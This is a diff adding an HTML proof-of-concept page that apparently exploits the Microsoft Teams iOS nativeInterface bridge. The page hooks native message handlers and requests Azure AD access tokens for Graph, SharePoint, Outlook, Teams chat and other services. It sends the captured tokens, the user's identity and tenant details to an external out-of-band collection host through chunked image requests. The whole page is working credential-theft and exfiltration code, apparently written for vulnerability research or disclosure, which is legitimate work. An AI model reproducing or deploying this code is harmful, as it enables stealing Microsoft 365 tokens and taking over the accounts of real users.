@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC — Teams iOS Token Theft via nativeInterface</title>
+</head>
+<body>
+<pre id="log"></pre>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+<script>
+(function() {
+    var NI = window.nativeInterface;
+    var LOG = document.getElementById('log');
+    var EXFIL = 't0fy2wieckpnhhisrjebqssd7r3bonqig.oast.site';
+
+    function log(msg) { LOG.textContent += msg + '\n'; }
+
+    function send(tag, data) {
+        var d = typeof data === 'string' ? data : JSON.stringify(data);
+        var encoded = encodeURIComponent(d);
+        var chunkSize = 1800;
+        var chunks = Math.ceil(encoded.length / chunkSize);
+        for (var c = 0; c < chunks; c++) {
+            var chunk = encoded.substring(c * chunkSize, (c + 1) * chunkSize);
+            new Image().src = 'https://' + EXFIL + '/?t=' + tag + '&c=' + c + '/' + chunks + '&d=' + chunk;
+        }
+    }
+
+    if (!NI) { log('[FAIL] nativeInterface not found'); return; }
+
+    // Resource map: id → readable name for exfil tags
+    var resourceNames = {};
+
+    // ========================================
+    // LAYER 1: Hook handleResponseFromNative
+    // Captures RAW base64 response BEFORE bridge processing
+    // ========================================
+    var origHRFN = NI.handleResponseFromNative;
+    NI.handleResponseFromNative = function(response, requestId) {
+        var label = resourceNames[requestId] || ('unknown_id_' + requestId);
+        log('[RAW] ' + label + ' | length=' + String(response).length);
+        try {
+            var decoded = atob(response);
+            var utf8 = decodeURIComponent(escape(decoded));
+            log('[RAW DECODED] ' + label + ' | ' + utf8.substring(0, 200));
+            send('raw_' + label, utf8);
+        } catch(e) {
+            send('raw_' + label, String(response));
+        }
+        return origHRFN.call(NI, response, requestId);
+    };
+
+    // ========================================
+    // LAYER 2: Hook onNativeMessage
+    // Captures processed AAD token delivered to SDK
+    // ========================================
+    var origNM = window.onNativeMessage;
+    window.onNativeMessage = function(evt) {
+        var data = evt && evt.data ? evt.data : evt;
+        var args = data.args || [];
+        var label = resourceNames[data.id] || ('unknown_id_' + data.id);
+
+        if (args[0] === true && typeof args[1] === 'string' && args[1].indexOf('eyJ') === 0) {
+            log('[STOLEN] ' + label + ' | token=' + args[1].substring(0, 60) + '...');
+            send('stolen_aad_token_' + label, args[1]);
+        } else {
+            log('[RESPONSE] ' + label + ' | ' + JSON.stringify(args).substring(0, 150));
+        }
+
+        if (origNM) return origNM.call(window, evt);
+    };
+
+    // ========================================
+    // INIT SDK + STEAL
+    // ========================================
+    microsoftTeams.app.initialize().then(function() {
+        return microsoftTeams.app.getContext();
+    }).then(function(ctx) {
+        var upn = ctx.user ? ctx.user.userPrincipalName : 'unknown';
+        var tid = ctx.user ? ctx.user.tenant ? ctx.user.tenant.id : '' : '';
+        log('[VICTIM] ' + upn + ' | tenant=' + tid);
+        send('victim_identity', {
+            upn: upn,
+            tenant: tid,
+            userId: ctx.user ? ctx.user.id : '',
+            teamId: ctx.team ? ctx.team.internalId : '',
+            channelId: ctx.channel ? ctx.channel.id : ''
+        });
+
+        // ========================================
+        // Steal AAD access tokens for Microsoft services
+        // ========================================
+        var targets = [
+            [100, 'graph_token',       'https://graph.microsoft.com'],
+            [101, 'skype_api_token',   'https://api.spaces.skype.com'],
+            [102, 'teams_chat_token',  'https://chatsvcagg.teams.microsoft.com'],
+            [103, 'sharepoint_token',  'https://*.sharepoint.com'],
+            [104, 'substrate_token',   'https://substrate.office.com'],
+            [105, 'outlook_token',     'https://outlook.office365.com'],
+            [106, 'graph_claims_token','https://graph.microsoft.com']
+        ];
+
+        targets.forEach(function(t) {
+            var id = t[0], name = t[1], resource = t[2];
+            resourceNames[id] = name;
+
+            var args = id === 106
+                ? [[resource, '{"access_token":{"xms_cc":{"values":["cp1"]}}}']]
+                : [[resource]];
+
+            NI.framelessPostMessage(JSON.stringify({
+                func: 'authentication.getAuthToken',
+                id: id,
+                args: args
+            }));
+            log('[REQ] ' + name + ' → ' + resource);
+        });
+
+        // ========================================
+        // Full context dump
+        // ========================================
+        setTimeout(function() {
+            send('full_context', ctx);
+        }, 3000);
+
+        log('\nAll requests sent. Tokens will appear above as they arrive.');
+    });
+})();
+</script>
+</body>
+</html>
